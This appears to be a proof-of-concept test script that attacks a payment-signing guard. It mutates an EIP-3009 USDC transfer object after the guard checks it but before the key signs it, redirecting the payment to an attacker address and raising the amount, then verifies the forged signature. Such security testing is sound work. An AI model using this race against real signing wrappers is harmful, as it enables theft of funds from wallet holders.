/**
 * ATTACK B — the same bypass with NO getters, NO Proxy, NO exotica.
 *
 * `gatedSignTypedData` extracts synchronously and then awaits. So a caller can
 * simply not await, mutate the plain object it just passed, and the key signs
 * the mutated version while the guard vets the original. This is a plain-old
 * data race between a caller and its own argument — the wrapper never copies.
 */
import { recoverTypedDataAddress, getAddress } from "viem";
import { rig, SELLER, USDC, CHAIN_ID, eip3009Types, randomNonce, tag } from "./attack-harness.mjs";

const ATTACKER = getAddress("0xdead00000000000000000000000000000000dead");
const { guarded, ledger, realAccount } = rig();

console.log("=== ATTACK B: mutate the plain object after the call, before the await ===\n");

const nonce = randomNonce();
const validBefore = BigInt(Math.floor(Date.now() / 1000) + 300);
const td = {
  domain: { name: "USDC", version: "2", chainId: CHAIN_ID, verifyingContract: USDC },
  types: eip3009Types,
  primaryType: "TransferWithAuthorization",
  message: {
    from: realAccount.address,
    to: SELLER,
    value: 10_000n,
    validAfter: 0n,
    validBefore,
    nonce,
  },
};

// Fire and DO NOT await. extractPayment() has already run synchronously.
const pending = guarded.signTypedData(td);
// Now rewrite the very object the key is about to hash.
td.message.to = ATTACKER;
td.message.value = 100_000_000n;

let sig;
try {
  sig = await pending;
} catch (err) {
  console.log("refused:", tag(err));
  console.log("\nATTACK B FAILED — no signature produced.");
  process.exit(0);
}

const hostileView = {
  domain: td.domain,
  types: eip3009Types,
  primaryType: "TransferWithAuthorization",
  message: {
    from: realAccount.address,
    to: ATTACKER,
    value: 100_000_000n,
    validAfter: 0n,
    validBefore,
    nonce,
  },
};
const rec = await recoverTypedDataAddress({ ...hostileView, signature: sig }).catch((e) => `n/a (${e.name})`);
const ok = String(rec).toLowerCase() === realAccount.address.toLowerCase();

const entries = await ledger.all();
const intent = entries.find((e) => e.type === "intent_received")?.data?.intent;

console.log("signature                     :", sig);
console.log("recovers under HOSTILE payload:", rec, ok ? "(VALID)" : "");
console.log("guard approved & counted      :", intent?.amount?.amountMinor, "->", intent?.merchant?.id);
console.log("key signed                    :", "100000000 ->", ATTACKER.toLowerCase());
console.log("ledger verify                 :", JSON.stringify(await ledger.verify()));
console.log("\nBYPASS:", ok && intent?.amount?.amountMinor === 10_000);
